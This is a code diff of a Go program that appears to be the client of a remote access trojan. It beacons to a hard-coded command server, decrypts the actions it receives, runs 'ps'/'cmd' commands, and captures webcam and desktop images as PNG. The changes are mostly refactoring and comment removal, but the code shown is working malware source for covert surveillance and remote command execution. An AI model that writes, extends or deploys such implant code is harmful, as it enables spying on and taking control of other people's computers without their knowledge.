@@ -35,23 +35,23 @@ import (
 )
 
 var (
-	CVER              string = "0.2.0"
-	TYPE              string = "go"
-	chunkSize         int    = 1024
-	client            net.Conn
-	sessionId         string
-	logStream         *log.Logger
-	logEnabled        bool      = false
-	logpath           string    = "logs/client.log"
-	address           string    = "10.0.0.127"
-	port              string    = "54678"
-	startTime         time.Time = time.Now().UTC()
-	exitProcess       bool      = false
-	sentFirstBeacon   bool      = false
-	maxRetries        int       = 5
-	beaconMinInterval uint32    = 5 * 60 * 1000
-	beaconMaxInterval uint32    = 45 * 60 * 1000
-	retryIntervals              = []int{
+	CVER            string = "0.2.0"
+	TYPE            string = "go"
+	chunkSize       int    = 1024
+	client          net.Conn
+	sessionId       string
+	logStream       *log.Logger
+	logEnabled      bool      = false
+	logpath         string    = "logs/client.log"
+	address         string    = "10.0.0.127"
+	port            string    = "54678"
+	startTime       time.Time = time.Now().UTC()
+	exitProcess     bool      = false
+	sentFirstBeacon bool      = false
+	//maxRetries        int       = 5
+	//beaconMinInterval uint32    = 5 * 60 * 1000
+	//beaconMaxInterval uint32    = 45 * 60 * 1000
+	retryIntervals = []int{
 		10000,
 		30000,
 		(1 * 60 * 1000),
@@ -382,7 +382,7 @@ func FormatFileName(name, extension string) string {
 	return fmt.Sprintf("%s_%d-%s-%s_%s-%s-%s.%s", name, year, month, day, hours, minutes, seconds, ext)
 }
 
-func CaptureWebcam() (image.Image, error) {
+func CaptureWebcam() ([]byte, error) {
 	windowName, err := windows.UTF16PtrFromString("WebcamCapture")
 	if err != nil {
 		return nil, fmt.Errorf("failed to convert window name: %v", err)
@@ -405,7 +405,12 @@ func CaptureWebcam() (image.Image, error) {
 	if err != nil {
 		return nil, fmt.Errorf("failed to get image from clipboard: %v", err)
 	}
-	return img, nil
+	var buf bytes.Buffer
+	err = png.Encode(&buf, img)
+	if err != nil {
+		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
+	}
+	return buf.Bytes(), nil
 }
 
 func CaptureDesktop() ([]byte, error) {
@@ -414,25 +419,20 @@ func CaptureDesktop() ([]byte, error) {
 		return nil, fmt.Errorf("failed to get screen device context")
 	}
 	defer releaseDC.Call(0, screenDC)
-
 	hdcMem, _, _ := createCompatibleDC.Call(screenDC)
 	if hdcMem == 0 {
 		return nil, fmt.Errorf("failed to create compatible device context")
 	}
 	defer deleteDC.Call(hdcMem)
-
 	screenWidth, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
 	screenHeight, _, _ := getSystemMetrics.Call(SM_CYSCREEN)
-
 	bitmap, _, _ := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
 	if bitmap == 0 {
 		return nil, fmt.Errorf("failed to create compatible bitmap")
 	}
 	defer deleteObject.Call(bitmap)
-
 	oldBitmap, _, _ := selectObject.Call(hdcMem, bitmap)
 	defer selectObject.Call(hdcMem, oldBitmap)
-
 	ret, _, _ := bitBlt.Call(
 		hdcMem, 0, 0, screenWidth, screenHeight,
 		screenDC, 0, 0, SRCCOPY,
@@ -440,25 +440,19 @@ func CaptureDesktop() ([]byte, error) {
 	if ret == 0 {
 		return nil, fmt.Errorf("BitBlt failed")
 	}
-
-	// Convert the bitmap to image.Image
 	img, err := bitmapToImage(hdcMem, screenWidth, screenHeight)
 	if err != nil {
 		return nil, fmt.Errorf("failed to convert bitmap to image: %v", err)
 	}
-
-	// Encode the image as PNG
 	var buf bytes.Buffer
 	err = png.Encode(&buf, img)
 	if err != nil {
 		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
 	}
-
 	return buf.Bytes(), nil
 }
 
 func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
-	// Prepare BITMAPINFO structure
 	bmi := BITMAPINFO{
 		BmiHeader: BITMAPINFOHEADER{
 			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
@@ -469,8 +463,6 @@ func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
 			BiCompression: 0,  // BI_RGB, no compression
 		},
 	}
-
-	// Get the size of the bitmap data
 	var bmpSize uint32
 	_, _, _ = getDIBits.Call(
 		hdcMem,
@@ -484,11 +476,7 @@ func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
 	if bmpSize == 0 {
 		return nil, fmt.Errorf("failed to get bitmap data size")
 	}
-
-	// Allocate buffer for the bitmap data
 	data := make([]byte, bmpSize)
-
-	// Get the bitmap data
 	_, _, _ = getDIBits.Call(
 		hdcMem,
 		0, // Bitmap handle is not necessary for this call
@@ -498,11 +486,7 @@ func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
 		uintptr(unsafe.Pointer(&data[0])),
 		0,
 	)
-
-	// Create an RGBA image
 	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
-
-	// Copy the pixel data to the image
 	rowSize := (width*3 + 3) &^ 3 // Row size rounded up to the nearest 4 bytes
 	for y := 0; y < int(height); y++ {
 		for x := 0; x < int(width); x++ {
@@ -513,7 +497,6 @@ func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
 			img.Set(x, int(height)-y-1, color.RGBA{R: r, G: g, B: b, A: 255})
 		}
 	}
-
 	return img, nil
 }
 
@@ -620,7 +603,6 @@ func RunCommand(command string, payload string, isFile bool) (string, error) {
 			return "", fmt.Errorf("command failed: %v. Error output: %s", err, stderr.String())
 		}
 	}
-
 	return stdout.String(), nil
 }
 
@@ -650,11 +632,9 @@ func ParseAction(action string) {
 		}
 	}()
 
-	// Trim and split the action string
 	action = strings.TrimSpace(action)
 	re := regexp.MustCompile(`(?:(?:"[^"]*")|(?:\S+))`)
 	parts := re.Split(action, -1)
-
 	if len(parts) < 1 {
 		SendCommand(map[string]interface{}{
 			"response": map[string]interface{}{
@@ -663,10 +643,8 @@ func ParseAction(action string) {
 		})
 		return
 	}
-
 	command := parts[0]
 	properties := parts[1:]
-
 	WriteLog("Command: %s - Properties: %s", command, strings.Join(properties, " "))
 	switch command {
 	case "ps", "cmd":
@@ -750,14 +728,11 @@ func HandleConnection(conn net.Conn) {
 		return
 	}
 	data := buf[:n]
-
 	WriteLog("Received Data: %s", string(data))
-
 	action, err := DecryptData(string(data), sessionId)
 	if err != nil {
 		WriteLog("DecryptData error: %v", err)
 	}
-
 	if len(action) != 0 {
 		ParseAction(action)
 	}
@@ -772,21 +747,15 @@ func ConnectToServer() {
 				WriteLog(err.Error())
 				exitProcess = true
 			}
-
 			client = conn
 		}
-
 		if len(sessionId) == 0 {
 			GetSessionID()
 		}
-
 		if !sentFirstBeacon {
-			// Send a beacon
-			SendBeacon()
+			SendBeacon() // Send a beacon
 			sentFirstBeacon = true
 		}
-
-		// Handle read response
 		HandleConnection(client)
 	}
 }
